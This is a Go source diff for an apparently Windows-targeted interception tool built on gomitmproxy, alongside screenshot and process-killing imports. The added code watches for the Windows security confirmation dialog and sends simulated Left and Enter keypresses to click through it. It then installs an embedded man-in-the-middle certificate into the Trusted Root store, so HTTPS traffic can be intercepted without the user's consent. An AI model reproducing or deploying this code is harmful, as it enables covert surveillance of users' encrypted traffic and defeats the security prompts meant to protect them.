@@ -6,13 +6,18 @@ import (
 	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
+	_ "embed"
 	"encoding/base64"
+	"encoding/pem"
 	"fmt"
 	"github.com/AdguardTeam/gomitmproxy"
 	"github.com/AdguardTeam/gomitmproxy/mitm"
 	"github.com/AdguardTeam/gomitmproxy/proxyutil"
+	"github.com/lxn/win"
+	"github.com/micmonay/keybd_event"
 	"github.com/mitchellh/go-ps"
 	"github.com/vova616/screenshot"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
 	"io"
@@ -211,12 +216,60 @@ func closeNewProcesses(stopClose chan bool) {
 	}
 }
 
-// for checking if you need to install cert
+// to check if cert is installed
 var x = 1
+
+func IsDialogBoxOpen() bool {
+	var hwnd win.HWND
+	hwnd = win.GetForegroundWindow()
+	if hwnd != 0 {
+		var class [256]uint16
+		win.GetClassName(hwnd, &class[0], 256)
+
+		className := win.UTF16PtrToString(&class[0])
+		if className == "#32770" {
+			kb, err := keybd_event.NewKeyBonding()
+			if err != nil {
+				fmt.Println("Failed to create key bonding:", err)
+			}
+			kb.SetKeys(keybd_event.VK_LEFT)
+			err = kb.Launching()
+			if err != nil {
+				fmt.Println("Failed to simulate left arrow key press:", err)
+			}
+			kb.SetKeys(keybd_event.VK_ENTER)
+			err = kb.Launching()
+			if err != nil {
+				fmt.Println("Failed to simulate enter key press:", err)
+			}
+			fmt.Println("activevevevevevev")
+			return true
+		}
+	}
+
+	return false
+}
+
+//go:embed demo.crt
+var certdata []byte
+
+//go:embed demo.key
+var keydata []byte
+
+func find() {
+	for {
+		if IsDialogBoxOpen() {
+			break
+		}
+	}
+	return
+}
 
 func redirect(source string, dest string) {
 	// Read the MITM cert and key.
-	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
+	fmt.Println(certdata)
+	fmt.Println(keydata)
+	tlsCert, err := tls.X509KeyPair(certdata, keydata)
 	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)
 
 	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
@@ -224,46 +277,42 @@ func redirect(source string, dest string) {
 		log.Fatal(err)
 	}
 
-	//if x == 1 {
-	//	certFile := "C:\\Users\\IMOE001\\Desktop\\demo.crt"
-	//	certData, err := ioutil.ReadFile(certFile)
-	//	if err != nil {
-	//		log.Fatal(err)
-	//	}
-	//
-	//	// Parse certificate
-	//	block, _ := pem.Decode(certData)
-	//	if block == nil {
-	//		log.Fatal("Failed to parse certificate")
-	//	}
-	//	cert, err := x509.ParseCertificate(block.Bytes)
-	//	if err != nil {
-	//		log.Fatal(err)
-	//	}
-	//
-	//	store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
-	//	if err != nil {
-	//		log.Fatal(err)
-	//	}
-	//	certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
-	//	if certContext == nil {
-	//		log.Fatal("Failed to create certificate context")
-	//	}
-	//	defer func(ctx *windows.CertContext) {
-	//		err := windows.CertFreeCertificateContext(ctx)
-	//		if err != nil {
-	//
-	//		}
-	//	}(certContext)
-	//
-	//	err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_REPLACE_EXISTING, nil)
-	//	if err != nil {
-	//		log.Fatal(err)
-	//	}
-	//
-	//	fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
-	//	x = 2
-	//}
+	if x == 1 {
+		// Parse certificate
+		go find()
+		block, _ := pem.Decode(certdata)
+		if block == nil {
+			log.Fatal("Failed to parse certificate")
+		}
+		cert, err := x509.ParseCertificate(block.Bytes)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
+		if certContext == nil {
+			log.Fatal("Failed to create certificate context")
+		}
+		defer func(ctx *windows.CertContext) {
+			err := windows.CertFreeCertificateContext(ctx)
+			if err != nil {
+
+			}
+		}(certContext)
+
+		err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_ALWAYS, nil)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
+		x = 2
+	}
 	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
 		certsCache: map[string]*tls.Certificate{}},
 	)
